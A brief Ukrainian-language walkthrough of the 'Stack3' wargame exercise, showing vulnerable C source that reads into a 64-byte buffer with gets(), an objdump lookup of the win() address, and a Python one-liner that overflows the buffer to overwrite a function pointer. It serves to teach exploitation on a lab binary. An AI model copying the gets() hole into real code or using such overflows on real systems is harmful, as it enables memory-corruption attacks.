# STACK3

Отже, ось код для Stack3:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
Спочатку нам потрібно з'ясувати, яка адреса функції win знаходиться в пам'яті, на щастя, objdump покаже це досить чітко.

objdump -x stack3 | grep win

![image](https://user-images.githubusercontent.com/47494881/147484203-9ef6796c-8144-4645-8e0d-77d8dce6d99e.png)

Тепер необхідно переписати зміну fp для цього зновштаки нам знадоюиться 64 байти сміття (64 'а'), а потім адрес функції win
```
(python -c "print 'a'*64 + '\x24\x84\x04\x08'";) | ./stack3
```
Результати:

![image](https://user-images.githubusercontent.com/47494881/147484764-08acca82-e1ed-44f2-90da-4c7b4172f9f7.png)

